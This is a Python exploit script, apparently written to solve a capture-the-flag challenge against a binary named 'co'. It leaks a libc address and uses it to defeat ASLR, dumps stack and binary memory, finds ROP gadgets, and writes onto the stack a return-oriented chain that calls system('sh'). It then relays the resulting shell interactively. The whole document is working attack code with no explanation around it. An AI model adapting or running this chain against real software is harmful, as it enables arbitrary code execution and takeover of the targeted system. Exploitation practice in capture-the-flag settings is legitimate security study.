import libco, sys, os

symbols = {}

for i in os.popen('objdump -D '+sys.argv[1]+" | grep '>:$'"):
    addr = int(i.split()[0], 16)
    name = i.split('<', 1)[1].split('>', 1)[0].split('@', 1)[0]
    symbols[name] = addr

with open(sys.argv[1], 'rb') as file:
    data = file.read()
    pop_edi = data.find(b'\x5f\xc3') # pop edi; ret
    pop_esi = data.find(b'\x5e\xc3') # pop edi; ret
    pop_7 = data.find(b'\x5a\x59\x5b\x5d\x41\x5c\x41\x5d\x41\x5e\xc3') # pop rdx, rcx, rbx, rbp, r12, r13, r14; ret
    pop_3 = data.find(b'\x5a\x59\x5b\xc3') # pop rdx, rcx, rbx; ret

co = libco.CO(sys.argv[2:])

print('Connected!')

def N(x):
    return int.from_bytes(x, 'little')

def B(x):
    return x.to_bytes(8, 'little')

stdout = N(co.query(b'\x10'))

print('stdout = '+hex(stdout))

STDOUT_ADDR = symbols['_IO_2_1_stdout_']
ENVIRON_ADDR = symbols['__environ']

libc_base = stdout - STDOUT_ADDR
environ_p = libc_base + ENVIRON_ADDR
print('environ_p = '+hex(environ_p))
environ = N(co.query(B(environ_p)))
print('environ = '+hex(environ))

print('Dumping stack...')

def dump256(addr):
    print('dumping...')
    return b''.join(co.query_multiple([B(i) for i in range(addr, addr + 256, 8)]))

def dump4096(addr):
    return b''.join(dump256(i) for i in range(addr, addr + 4096, 256))

stack_page = environ & -4096

with open('co.dump', 'wb') as file: file.write(dump4096(stack_page))

print('Dumped to co.dump')

libc_csu_init = N(co.query(B(environ - 248)))
co_base = libc_csu_init & -4096

print('./co base = '+hex(co_base))

print('Dumping ./co...')

with open('co-bin.dump', 'wb') as file:
    file.write(dump4096(co_base))
    file.write(dump4096(co_base+4096))

print('Dumped to co-bin.dump')

print('Pwning...')

rop_start = environ - 240

co.write_multiple([
    (B(rop_start), B(libc_base+pop_edi)),
    (B(rop_start+8), B(1)),
    (B(rop_start+16), B(libc_base+pop_esi)),
    (B(rop_start+24), B(rop_start+160)),
    (B(rop_start+32), B(libc_base+pop_3)),
    (B(rop_start+40), b'\x0e\0\0\0\0\0\0\0'),
    (B(rop_start+48), bytes(8)),
    (B(rop_start+56), bytes(8)),
    (B(rop_start+64), B(libc_base+symbols['__write'])),
    (B(rop_start+72), B(libc_base+pop_edi)),
    (B(rop_start+80), b'\1\0\0\0\0\0\0\0'),
    (B(rop_start+88), B(libc_base+pop_esi)),
    (B(rop_start+96), b'\2\0\0\0\0\0\0\0'),
    (B(rop_start+104), B(libc_base+symbols['__dup2'])),
    (B(rop_start+112), B(libc_base+pop_edi)),
    (B(rop_start+120), B(rop_start+175)),
    (B(rop_start+128), B(libc_base+symbols['__libc_system'])),
    (B(rop_start+136), B(libc_base+pop_edi)),
    (B(rop_start+144), bytes(8)),
    (B(rop_start+152), B(libc_base+symbols['exit'])),
    (B(rop_start+160), b'Hello, w'),
    (B(rop_start+168), b'orld!\n\0s'),
    (B(rop_start+176), b'h\0\0\0\0\0\0\0')
])

#import signal
#os.kill(co.p.pid, signal.SIGSTOP)
#print(co.p.pid)
#input()

co.send_write(
    B(rop_start-32), B(libc_base+pop_3)
)
co.flush()

print('Pwned! Closing connection...')

#co.close()

def copy_thread(a, b):
    while True:
        d = os.read(a.fileno(), 1024)
        assert d
        os.write(b.fileno(), d)

import _thread

_thread.start_new_thread(copy_thread, (co.p.stdout, sys.stdout))
copy_thread(sys.stdin, co.p.stdin)
